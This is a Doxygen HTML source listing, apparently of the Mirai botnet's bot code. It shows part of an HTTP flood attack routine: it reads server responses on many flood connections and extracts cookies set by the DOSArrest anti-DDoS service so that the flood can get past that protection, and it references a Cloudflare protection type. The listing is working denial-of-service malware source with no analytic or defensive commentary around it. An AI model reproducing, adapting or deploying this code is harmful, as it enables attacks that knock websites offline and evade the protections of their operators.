conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> -= <a class="code" href="attack_8h.html#a8491fa980eede52fb92fb6dd2a46a913">HTTP_HACK_DRAIN</a>;</div><div class="line"><a name="l00697"></a><span class="lineno">  697</span>&#160;                        }</div><div class="line"><a name="l00698"></a><span class="lineno">  698</span>&#160;                        errno = 0;</div><div class="line"><a name="l00699"></a><span class="lineno">  699</span>&#160;                        ret = recv(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a> + conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>, <a class="code" href="attack_8h.html#ac6eda2a3273daf4a93162bb51f969093">HTTP_RDBUF_SIZE</a> - conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00700"></a><span class="lineno">  700</span>&#160;                        <span class="keywordflow">if</span> (ret == 0)</div><div class="line"><a name="l00701"></a><span class="lineno">  701</span>&#160;                        {</div><div class="line"><a name="l00702"></a><span class="lineno">  702</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00703"></a><span class="lineno">  703</span>&#160;                            printf(<span class="stringliteral">&quot;[http flood] FD%d connection gracefully closed\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00704"></a><span class="lineno">  704</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00705"></a><span class="lineno">  705</span>&#160;                            errno = ECONNRESET;</div><div class="line"><a name="l00706"></a><span class="lineno">  706</span>&#160;                            ret = -1; <span class="comment">// Fall through to closing connection below</span></div><div class="line"><a name="l00707"></a><span class="lineno">  707</span>&#160;                        }</div><div class="line"><a name="l00708"></a><span class="lineno">  708</span>&#160;                        <span class="keywordflow">if</span> (ret == -1)</div><div class="line"><a name="l00709"></a><span class="lineno">  709</span>&#160;                        {</div><div class="line"><a name="l00710"></a><span class="lineno">  710</span>&#160;                            <span class="keywordflow">if</span> (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK)</div><div class="line"><a name="l00711"></a><span class="lineno">  711</span>&#160;                            {</div><div class="line"><a name="l00712"></a><span class="lineno">  712</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00713"></a><span class="lineno">  713</span>&#160;                                printf(<span class="stringliteral">&quot;[http flood] FD%d lost connection\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00714"></a><span class="lineno">  714</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00715"></a><span class="lineno">  715</span>&#160;                                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00716"></a><span class="lineno">  716</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00717"></a><span class="lineno">  717</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00718"></a><span class="lineno">  718</span>&#160;                            }</div><div class="line"><a name="l00719"></a><span class="lineno">  719</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00720"></a><span class="lineno">  720</span>&#160;                        }</div><div class="line"><a name="l00721"></a><span class="lineno">  721</span>&#160;</div><div class="line"><a name="l00722"></a><span class="lineno">  722</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> += ret;</div><div class="line"><a name="l00723"></a><span class="lineno">  723</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a57ddd53019ddf55a509aae9c74e2ecfa">last_recv</a> = fake_time;</div><div class="line"><a name="l00724"></a><span class="lineno">  724</span>&#160;</div><div class="line"><a name="l00725"></a><span class="lineno">  725</span>&#160;                        <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00726"></a><span class="lineno">  726</span>&#160;                        {</div><div class="line"><a name="l00727"></a><span class="lineno">  727</span>&#160;                            <span class="keywordtype">int</span> consumed = 0;</div><div class="line"><a name="l00728"></a><span class="lineno">  728</span>&#160;</div><div class="line"><a name="l00729"></a><span class="lineno">  729</span>&#160;                            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> &gt; 0)</div><div class="line"><a name="l00730"></a><span class="lineno">  730</span>&#160;                            {</div><div class="line"><a name="l00731"></a><span class="lineno">  731</span>&#160;</div><div class="line"><a name="l00732"></a><span class="lineno">  732</span>&#160;                                consumed = conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> &gt; conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> ? conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> : conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a>;</div><div class="line"><a name="l00733"></a><span class="lineno">  733</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> -= consumed;</div><div class="line"><a name="l00734"></a><span class="lineno">  734</span>&#160;</div><div class="line"><a name="l00735"></a><span class="lineno">  735</span>&#160;                                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a97f15ea73d0347511f511318f0949e86">protection_type</a> == <a class="code" href="attack_8h.html#af9036def147b9e5de7a7b981f1d6212e">HTTP_PROT_DOSARREST</a>)</div><div class="line"><a name="l00736"></a><span class="lineno">  736</span>&#160;                                {</div><div class="line"><a name="l00737"></a><span class="lineno">  737</span>&#160;                                    <span class="comment">// we specifically want this to be case sensitive</span></div><div class="line"><a name="l00738"></a><span class="lineno">  738</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#aa5dbdc8879922e71d9a920cc8bc91657">TABLE_ATK_SET_COOKIE</a>, NULL), 11) != -1)</div><div class="line"><a name="l00739"></a><span class="lineno">  739</span>&#160;                                    {</div><div class="line"><a name="l00740"></a><span class="lineno">  740</span>&#160;                                        <span class="keywordtype">int</span> start_pos = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#aa5dbdc8879922e71d9a920cc8bc91657">TABLE_ATK_SET_COOKIE</a>, NULL), 11);</div><div class="line"><a name="l00741"></a><span class="lineno">  741</span>&#160;                                        <span class="keywordtype">int</span> end_pos = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(&amp;(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos]), conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> - start_pos, <span class="stringliteral">&quot;&#39;&quot;</span>, 1);</div><div class="line"><a name="l00742"></a><span class="lineno">  742</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos + (end_pos - 1)] = 0;</div><div class="line"><a name="l00743"></a><span class="lineno">  743</span>&#160;</div><div class="line"><a name="l00744"></a><span class="lineno">  744</span>&#160;                                        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a> &lt; <a class="code" href="attack_8h.html#a7afb6e2da31b70aad81a3a8c4cce03ac">HTTP_COOKIE_MAX</a> &amp;&amp; <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos])) &lt; <a class="code" href="attack_8h.html#a843d2259e52b51843a2abe0bfb764dc4">HTTP_COOKIE_LEN_MAX</a>)</div><div class="line"><a name="l00745"></a><span class="lineno">  745</span>&#160;                                        {</div><div class="line"><a name="l00746"></a><span class="lineno">  746</span>&#160;                                            <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>], &amp;(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos]));</div><div class="line"><a name="l00747"></a><span class="lineno">  747</span>&#160;                                            <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>] + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>]), <span class="stringliteral">&quot;=&quot;</span>);</div><div class="line"><a name="l00748"></a><span class="lineno">  748</span>&#160;</div><div class="line"><a name="l00749"></a><span class="lineno">  749</span>&#160;                                            start_pos += end_pos + 3;</div><div class="line"><a name="l00750"></a><span class="lineno">  750</span>&#160;                                            end_pos = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(&amp;(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos]), conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> - start_pos, <span class="stringliteral">&quot;&#39;&quot;</span>, 1);</div><div class="line"><a name="l00751"></a><span class="lineno">  751</span>&#160;                                            conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos + (end_pos - 1)] = 0;</div><div class="line"><a name="l00752"></a><span class="lineno">  752</span>&#160;</div><div class="line"><a name="l00753"></a><span class="lineno">  753</span>&#160;                                            <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>] + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>]), &amp;(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[start_pos]));</div><div class="line"><a name="l00754"></a><span class="lineno">  754</span>&#160;                                            conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>++;</div><div class="line"><a name="l00755"></a><span class="lineno">  755</span>&#160;                                        }</div><div class="line"><a name="l00756"></a><span class="lineno">  756</span>&#160;</div><div class="line"><a name="l00757"></a><span class="lineno">  757</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> = -1;</div><div class="line"><a name="l00758"></a><span class="lineno">  758</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a>;</div><div class="line"><a name="l00759"></a><span class="lineno">  759</span>&#160;                                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00760"></a><span class="lineno">  760</span>&#160;                                    }</div><div class="line"><a name="l00761"></a><span class="lineno">  761</span>&#160;                                }</div><div class="line"><a name="l00762"></a><span class="lineno">  762</span>&#160;                            }</div><div class="line"><a name="l00763"></a><span class="lineno">  763</span>&#160;</div><div class="line"><a name="l00764"></a><span class="lineno">  764</span>&#160;                            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> == 0)</div><div class="line"><a name="l00765"></a><span class="lineno">  765</span>&#160;                            {</div><div class="line"><a name="l00766"></a><span class="lineno">  766</span>&#160;                                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a9ecd82038dfaf8c3677052cd20b45b16">chunked</a> == 1)</div><div class="line"><a name="l00767"></a><span class="lineno">  767</span>&#160;                                {</div><div class="line"><a name="l00768"></a><span class="lineno">  768</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2) != -1)</div><div class="line"><a name="l00769"></a><span class="lineno">  769</span>&#160;                                    {</div><div class="line"><a name="l00770"></a><span class="lineno">  770</span>&#160;                                        <span class="keywordtype">int</span> new_line_pos = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00771"></a><span class="lineno">  771</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[new_line_pos - 2] = 0;</div><div class="line"><a name="l00772"></a><span class="lineno">  772</span>&#160;                                        <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, new_line_pos, <span class="stringliteral">&quot;;&quot;</span>, 1) != -1)</div><div class="line"><a name="l00773"></a><span class="lineno">  773</span>&#160;                                            conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, new_line_pos, <span class="stringliteral">&quot;;&quot;</span>, 1)] = 0;</div><div class="line"><a name="l00774"></a><span class="lineno">  774</span>&#160;</div><div class="line"><a name="l00775"></a><span class="lineno">  775</span>&#160;                                        <span class="keywordtype">int</span> chunklen = <a class="code" href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, 16);</div><div class="line"><a name="l00776"></a><span class="lineno">  776</span>&#160;</div><div class="line"><a name="l00777"></a><span class="lineno">  777</span>&#160;                                        <span class="keywordflow">if</span> (chunklen == 0)</div><div class="line"><a name="l00778"></a><span class="lineno">  778</span>&#160;                                        {</div><div class="line"><a name="l00779"></a><span class="lineno">  779</span>&#160;                                            conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>;</div><div class="line"><a name="l00780"></a><span class="lineno">  780</span>&#160;                                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00781"></a><span class="lineno">  781</span>&#160;                                        }</div><div class="line"><a name="l00782"></a><span class="lineno">  782</span>&#160;</div><div class="line"><a name="l00783"></a><span class="lineno">  783</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> = chunklen + 2;</div><div class="line"><a name="l00784"></a><span class="lineno">  784</span>&#160;                                        consumed = new_line_pos;</div><div class="line"><a name="l00785"></a><span class="lineno">  785</span>&#160;                                    }</div><div class="line"><a name="l00786"></a><span class="lineno">  786</span>&#160;                                } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00787"></a><span class="lineno">  787</span>&#160;                                    <span class="comment">// get rid of any extra in the buf before we move on...</span></div><div class="line"><a name="l00788"></a><span class="lineno">  788</span>&#160;                                    conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> = conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> - consumed;</div><div class="line"><a name="l00789"></a><span class="lineno">  789</span>&#160;                                    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> == 0)</div><div class="line"><a name="l00790"></a><span class="lineno">  790</span>&#160;                                    {</div><div class="line"><a name="l00791"></a><span class="lineno">  791</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>;</div><div class="line"><a name="l00792"></a><span class="lineno">  792</span>&#160;                                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00793"></a><span class="lineno">  793</span>&#160;                                    }</div><div class="line"><a name="l00794"></a><span class="lineno">  794</span>&#160;                                }</div><div class="line"><a name="l00795"></a><span class="lineno">  795</span>&#160;                            }</div><div class="line"><a name="l00796"></a><span class="lineno">  796</span>&#160;</div><div class="line"><a name="l00797"></a><span class="lineno">  797</span>&#160;                            <span class="keywordflow">if</span> (consumed == 0)</div><div class="line"><a name="l00798"></a><span class="lineno">  798</span>&#160;                                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00799"></a><span class="lineno">  799</span>&#160;                            <span class="keywordflow">else</span></div><div class="line"><a name="l00800"></a><span class="lineno">  800</span>&#160;                            {</div><div class="line"><a name="l00801"></a><span class="lineno">  801</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> -= consumed;</div><div class="line"><a name="l00802"></a><span class="lineno">  802</span>&#160;                                memmove(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a> + consumed, conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>);</div><div class="line"><a name="l00803"></a><span class="lineno">  803</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a>] = 0;</div><div class="line"><a name="l00804"></a><span class="lineno">  804</span>&#160;</div><div class="line"><a name="l00805"></a><span class="lineno">  805</span>&#160;                                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> == 0)</div><div class="line"><a name="l00806"></a><span class="lineno">  806</span>&#160;                                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00807"></a><span class="lineno">  807</span>&#160;                            }</div><div class="line"><a name="l00808"></a><span class="lineno">  808</span>&#160;                        }</div><div class="line"><a name="l00809"></a><span class="lineno">  809</span>&#160;                    }</div><div class="line"><a name="l00810"></a><span class="lineno">  810</span>&#160;                } <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a>) {</div><div class="line"><a name="l00811"></a><span class="lineno">  811</span>&#160;                    <span class="keywordflow">while</span>(<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00812"></a><span class="lineno">  812</span>&#160;                    {</div><div class="line"><a name="l00813"></a><span class="lineno">  813</span>&#160;                        errno = 0;</div><div class="line"><a name="l00814"></a><span class="lineno">  814</span>&#160;                        ret = recv(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, generic_memes, 10240, MSG_NOSIGNAL);</div><div class="line"><a name="l00815"></a><span class="lineno">  815</span>&#160;                        <span class="keywordflow">if</span> (ret == 0)</div><div class="line"><a name="l00816"></a><span class="lineno">  816</span>&#160;                        {</div><div class="line"><a name="l00817"></a><span class="lineno">  817</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00818"></a><span class="lineno">  818</span>&#160;                            printf(<span class="stringliteral">&quot;[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00819"></a><span class="lineno">  819</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00820"></a><span class="lineno">  820</span>&#160;                            errno = ECONNRESET;</div><div class="line"><a name="l00821"></a><span class="lineno">  821</span>&#160;                            ret = -1; <span class="comment">// Fall through to closing connection below</span></div><div class="line"><a name="l00822"></a><span class="lineno">  822</span>&#160;                        }</div><div class="line"><a name="l00823"></a><span class="lineno">  823</span>&#160;                        <span class="keywordflow">if</span> (ret == -1)</div><div class="line"><a name="l00824"></a><span class="lineno">  824</span>&#160;                        {</div><div class="line"><a name="l00825"></a><span class="lineno">  825</span>&#160;                            <span class="keywordflow">if</span> (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK)</div><div class="line"><a name="l00826"></a><span class="lineno">  826</span>&#160;                            {</div><div class="line"><a name="l00827"></a><span class="lineno">  827</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00828"></a><span class="lineno">  828</span>&#160;                                printf(<span class="stringliteral">&quot;[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00829"></a><span class="lineno">  829</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00830"></a><span class="lineno">  830</span>&#160;                                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00831"></a><span class="lineno">  831</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00832"></a><span class="lineno">  832</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00833"></a><span class="lineno">  833</span>&#160;                            }</div><div class="line"><a name="l00834"></a><span class="lineno">  834</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00835"></a><span class="lineno">  835</span>&#160;                        }    </div><div class="line"><a name="l00836"></a><span class="lineno">  836</span>&#160;                    }</div><div class="line"><a name="l00837"></a><span class="lineno">  837</span>&#160;                    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> != <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>)</div><div class="line"><a name="l00838"></a><span class="lineno">  838</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>;</div><div class="line"><a name="l00839"></a><span class="lineno">  839</span>&#160;                }</div><div class="line"><a name="l00840"></a><span class="lineno">  840</span>&#160;            }</div><div class="line"><a name="l00841"></a><span class="lineno">  841</span>&#160;        }</div><div class="line"><a name="l00842"></a><span class="lineno">  842</span>&#160;</div><div class="line"><a name="l00843"></a><span class="lineno">  843</span>&#160;        <span class="comment">// handle any sockets that didnt return from select here</span></div><div class="line"><a name="l00844"></a><span class="lineno">  844</span>&#160;        <span class="comment">// also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)</span></div><div class="line"><a name="l00845"></a><span class="lineno">  845</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00846"></a><span class="lineno">  846</span>&#160;        <span class="keywordflow">if</span> (sockets == 1)</div><div class="line"><a name="l00847"></a><span class="lineno">  847</span>&#160;        {</div><div class="line"><a name="l00848"></a><span class="lineno">  848</span>&#160;            printf(<span class="stringliteral">&quot;debug mode sleep\n&quot;</span>);</div><div class="line"><a name="l00849"></a><span class="lineno">  849</span>&#160;            sleep(1);</div><div class="line"><a name="l00850"></a><span class="lineno">  850</span>&#160;        }</div><div class="line"><a name="l00851"></a><span class="lineno">  851</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00852"></a><span class="lineno">  852</span>&#160;    }</div><div class="line"><a name="l00853"></a><span class="lineno">  853</span>&#160;}</div><div class="ttc" id="attack_8h_html_a358ec495035a144be684ef619051366b"><div class="ttname"><a href="attack_8h.html#a358ec495035a144be684ef619051366b">HTTP_PROT_CLOUDFLARE</a></div><div class="ttdeci">#define HTTP_PROT_CLOUDFLARE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00106">attack.h:106</a></div></div>
<div class="ttc" id="structattack__http__state_html_a27591f11db921ba3e368790defda050d"><div class="ttname"><a href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">attack_http_state::rdbuf_pos</a></div><div class="ttdeci">int rdbuf_pos</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00130">attack.h:130</a></div></div>
<div class="ttc" id="structattack__http__state_html_a8119cf4b9557d805cd226410a206391a"><div class="ttname"><a href="structattack__http__state.html#a8119cf4b9557d805cd226410a206391a">attack_http_state::orig_method</a></div><div class="ttdeci">char orig_method[9]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00119">attack.h:119</a></div></div>
<div class="ttc" id="structattack__http__state_html_a3261c180242b8f5e1811e25c1b4c7f68"><div class="ttname"><a href="structattack__http__state.html#a3261c180242b8f5e1811e25c1b4c7f68">attack_http_state::dst_addr</a></div><div class="ttdeci">ipv4_t dst_addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00113">attack.h:113</a></div></div>
